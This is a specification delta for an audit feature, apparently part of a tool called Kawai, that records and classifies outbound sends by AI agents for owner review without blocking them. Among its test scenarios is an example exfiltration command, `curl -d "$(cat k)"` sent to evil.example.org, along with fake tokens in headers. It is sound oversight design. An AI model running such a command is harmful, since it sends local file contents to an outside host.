# Spec Delta

## Purpose

Records the outbound publish and send actions Kawai can observe its chat agents take, for the owner to audit afterwards. Capture is observational and never blocks, delays, or decides a tool call. Each observed send is classified against the allowed destinations, redacted, and stored in append-only records with its outcome. A violation is shown to the owner, who acknowledges it.

## ADDED Requirements

### Requirement: Audit hooks observe and never decide
Kawai SHALL register `PreToolUse`, `PostToolUse`, `PostToolUseFailure`, and `PermissionDenied` hooks for Bash, Monitor, and external MCP tools, subagent calls included. Every hook SHALL return only `{ continue: true }`, with no permission decision, input update, retry, or message, SHALL swallow observer errors, and SHALL return before any file read or database write.

#### Scenario: A hook output carries no decision
- **WHEN** the audit hook handles any event of any audited tool, including one whose observer throws
- **THEN** it returns exactly `{ continue: true }`

#### Scenario: Approvals are unchanged
- **WHEN** a session under `manual` runs `git push`
- **THEN** the approval card appears as before, and the audit neither grants nor denies it

#### Scenario: A subagent's send is observed
- **WHEN** a subagent runs `gh pr create` in the repository
- **THEN** the call is recorded with the subagent's id

### Requirement: Only observed sends are recorded
Kawai SHALL record each call a rule matches as a send or publish, allowed ones included, and, as the backstop, each call where a segment neither classified nor a proven non-send names a listed outbound command or URL or has a non-literal command word. A segment with any non-literal word SHALL never be a proven non-send. Nothing else SHALL be recorded: `kawai-team` calls SHALL NOT be, Kawai's own git and `gh` calls SHALL stay plan-execution effect rows, and every external MCP call SHALL be.

#### Scenario: A read is not recorded
- **WHEN** an agent runs `curl` with a plain GET, `git status`, or `grep -rn "git push" docs`
- **THEN** no audit row exists for the call

#### Scenario: A misread wrapper still records
- **WHEN** an agent runs `env --chdir /tmp git push fork`
- **THEN** a row exists for the call, and its verdict is not allowed

#### Scenario: An unmodeled sender is caught by the backstop
- **WHEN** an agent runs `ssh build.example.internal 'git push'`
- **THEN** a row exists with rule `unclassified-send`, verdict unknown-destination, and a destination naming the list entry, not command text

#### Scenario: A non-literal command word is recorded
- **WHEN** an agent runs `$G push origin x`
- **THEN** a row exists with rule `unclassified-send` and destination `unresolved:unclassified:command-not-literal`

#### Scenario: Team mail is not recorded
- **WHEN** an agent calls `mcp__kawai-team__send_message`
- **THEN** no audit row exists, and the mailbox records the message as before

#### Scenario: An external MCP call
- **WHEN** an agent calls a tool of an external MCP server
- **THEN** the call is recorded with rule `mcp-call` and the server's name

### Requirement: Sends are classified by rule and resolved target
A pure classifier SHALL match the `git-push`, `gh-write`, `gh-api-write`, `registry-publish`, `http-send`, `mail-send`, and `mcp-call` rules by argument position and flag. Text search SHALL only add `unclassified-send` rows, which are always unknown-destination. gh's implicit repository and git's push remote SHALL resolve from the repository's configuration. A message, title, body, or heredoc value SHALL never be a target.

#### Scenario: Origin-targeted gh is allowed
- **WHEN** an agent runs `gh pr comment 62 --body "see https://github.com/other/repo"` in a repository whose origin is the kawai repository
- **THEN** the target is origin and the verdict is allowed

#### Scenario: A foreign repository
- **WHEN** an agent runs `gh issue create -R other/repo --title x`
- **THEN** the verdict is violation with destination `other/repo`

#### Scenario: A repository set by variable
- **WHEN** an agent runs `export GH_REPO=other/repo; gh pr create --title x`
- **THEN** the verdict is unknown-destination, never allowed

#### Scenario: A push through a named remote
- **WHEN** an agent runs `git push fork main` where remote `fork` points to another GitHub repository
- **THEN** the verdict is violation naming that repository

### Requirement: Each send gets one verdict
A send SHALL be `allowed` only when every word of its segment is literal, every option and wrapper is known, the call's earlier segments are external commands or exactly evaluated builtins, and its target resolves to origin, an internal destination, a model provider, or a configured MCP server. It SHALL be `violation` when the target resolves elsewhere, mail included, else `unknown-destination`. A call SHALL keep its strongest verdict, list every match, and record the classifier version.

#### Scenario: An opaque directory is never allowed
- **WHEN** an agent runs `git -c a=b -C "$D" push`
- **THEN** the verdict is unknown-destination, never allowed

#### Scenario: A substitution anywhere blocks allowed
- **WHEN** an agent runs `gh pr comment 62 --body "$(cat notes.md)"` in a repository whose origin is the kawai repository
- **THEN** the verdict is unknown-destination, never allowed

#### Scenario: A plain push stays allowed
- **WHEN** an agent runs `cd /work/kawai && git push -u origin feat/x`, where `/work/kawai` is a repository whose origin is the kawai repository
- **THEN** the verdict is allowed

#### Scenario: A failed check blocks only allowed
- **WHEN** an agent runs `curl -d "$(cat k)" https://evil.example.org`
- **THEN** the verdict is violation, because the target's own words are literal and resolve outside every allowed class

#### Scenario: An unresolved target
- **WHEN** an agent runs `curl -d @data.json "$TARGET"`
- **THEN** the verdict is unknown-destination with the reason that the target is a variable

#### Scenario: A compound command
- **WHEN** one Bash call runs `git push && npm publish`
- **THEN** its row's verdict is violation for `registry-publish`, and its matches list both segments

#### Scenario: A configured internal registry
- **WHEN** an agent pushes an image to a registry under a configured internal domain
- **THEN** the verdict is allowed

### Requirement: Secrets are withheld or redacted before anything is written
Kawai SHALL store a fixed `‹withheld: <reason>›` placeholder for a command and its match segments when the command has a heredoc or here-string, sets a header, passes credentials, or contains a credential-like word or token shape; outcome detail likewise. Other text SHALL be redacted of known secret shapes before storing, logging, or showing. Destinations SHALL hold only a class with a host or `owner/repo`, or a reason code. Commands SHALL be stored up to 4096 characters, truncation marked.

#### Scenario: A token in a header
- **WHEN** an agent runs `curl -H "Authorization: Bearer abc123" -d x https://host.example.internal`
- **THEN** the stored command and match segments are the withheld placeholder, and no field of the row contains `abc123`

#### Scenario: Every header spelling is withheld
- **WHEN** an agent sends a header carrying `s3cr3tvalue` as curl's attached `-HAuthorization:s3cr3tvalue`, as unquoted `-H Authorization: Bearer s3cr3tvalue` words, or from a heredoc
- **THEN** no stored field of the call row, its matches, or its outcomes contains `s3cr3tvalue`

#### Scenario: A withheld command keeps its verdict
- **WHEN** an agent runs `gh pr comment 62 --body-file - <<'EOF'` with a literal body, in a repository whose origin is the kawai repository
- **THEN** the stored command is the withheld placeholder, and the rule, verdict, and destination are recorded as usual

#### Scenario: Credentials in a query string and a body
- **WHEN** an agent runs `curl -d '{"token":"abc"}' "https://host.example.internal/hook?api_key=xyz"`
- **THEN** the stored command, match segments, and destination contain neither `abc` nor `xyz`

#### Scenario: Credentials in a push URL
- **WHEN** an agent runs `git push https://user:secret@github.com/o/r.git`
- **THEN** the stored command and destination contain no `secret`

### Requirement: Audit records are append-only
Each recorded call SHALL store team, session, agent process, group, profile, task, subagent id, tool, MCP server, tool use id, withheld or redacted command, rule, verdict, destination, matches, classifier version, cwd, and time. Outcomes SHALL be separate append-only rows. No path SHALL update or delete either, and rows SHALL NOT be pruned.

#### Scenario: Configuration changes keep history
- **WHEN** the owner adds a domain after a send to it was judged a violation
- **THEN** that row stays a violation, and later sends to the domain are allowed

#### Scenario: Recorded once
- **WHEN** a hook reports the same tool use twice
- **THEN** one call row exists for it

### Requirement: Each call has a derived outcome state
Outcomes SHALL be `completed`, `failed`, `denied` (a permission denial or a declined card), or `started-background`. A call's state SHALL derive at read time: its terminal outcome, else started in background, else pending while its agent process lives, else outcome unknown. An unknown outcome SHALL never be re-run or re-judged.

#### Scenario: A declined push
- **WHEN** the human denies the approval card for a recorded `git push`
- **THEN** the call's outcome is denied

#### Scenario: The outcome lands first
- **WHEN** a recorded send completes before its queued call row is written
- **THEN** the outcome is kept, and the call reads completed once its row exists

#### Scenario: The process ends first
- **WHEN** an agent's process is killed after a recorded send and before any outcome
- **THEN** the call reads outcome unknown

#### Scenario: A background send
- **WHEN** a recorded send starts in the background
- **THEN** the call reads started in background and links to its background task

### Requirement: The owner audits sends in a read-only view
The Team page SHALL have an Audit tab listing the team's recorded calls newest first, with filters by verdict, rule, session, and time range, paging, counts of allowed sends per rule, and each row's outcome state. It SHALL be addressed by team path, refuse unknown teams, and offer no edit beyond Acknowledge. Its controls SHALL disable while disconnected.

#### Scenario: Filtering by verdict
- **WHEN** the owner filters the Audit tab to violations in the last 7 days
- **THEN** only violation rows from that range are listed, newest first, with the allowed-send counts for that range

#### Scenario: A new call appears
- **WHEN** an agent's send is recorded while the owner has the Audit tab open
- **THEN** the row appears at the top without a reload

### Requirement: Violations raise an informational attention item
Unacknowledged violations SHALL raise one team attention item of kind `outbound-violation` per rule and destination, owned by the human, naming the count and latest session, and linking (kind `audit`) to the newest row. Unknown destinations and allowed sends SHALL raise none. A verdict SHALL NOT become a stop reason, supervision cause, or dispatch, routing, or staffing input.

#### Scenario: A violation is raised
- **WHEN** a send is judged a violation
- **THEN** the attention queue shows an `outbound-violation` item for the human that opens the row in the Audit tab

#### Scenario: A stream to one server
- **WHEN** an agent calls an unlisted MCP server's tools five times
- **THEN** five violation rows exist and one attention item names that server with a count of five

#### Scenario: Execution continues
- **WHEN** a plan change's developer's send is judged a violation
- **THEN** the change's execution, supervision cause, and dispatch are unchanged

### Requirement: Only the human acknowledges a violation
The human SHALL acknowledge a violation, with an optional note, under a command id, covering its rule and destination group through that call: the item clears, rows and verdicts stay, and a later violation raises it again. A replay SHALL return the prior result; a different payload SHALL be refused naming the field. Non-violations and other teams' calls SHALL be refused. No agent tool SHALL read or write audit records.

#### Scenario: Acknowledge clears the item
- **WHEN** the owner acknowledges a violation and the result is lost, so the dialog resends it
- **THEN** one acknowledgement exists, the item is gone, and the row still reads violation

#### Scenario: Agents have no audit tool
- **WHEN** an agent looks for a tool to read, acknowledge, or delete audit records, or calls the service directly
- **THEN** no such tool exists and the direct call is refused with nothing written

### Requirement: The morning summary counts outbound sends
The team's morning summary SHALL carry a durable `outbound` bucket counting the window's violations, unknown destinations, and allowed sends, read from the audit records, so a restart never empties it. It SHALL count rows only and never change a session's status or any task.

#### Scenario: Counts for the window
- **WHEN** the window holds two allowed pushes, one unknown destination, and one violation
- **THEN** the `outbound` bucket shows 2 allowed, 1 unknown, and 1 violation

#### Scenario: After a restart
- **WHEN** the server restarts within the window
- **THEN** the `outbound` bucket shows the same counts
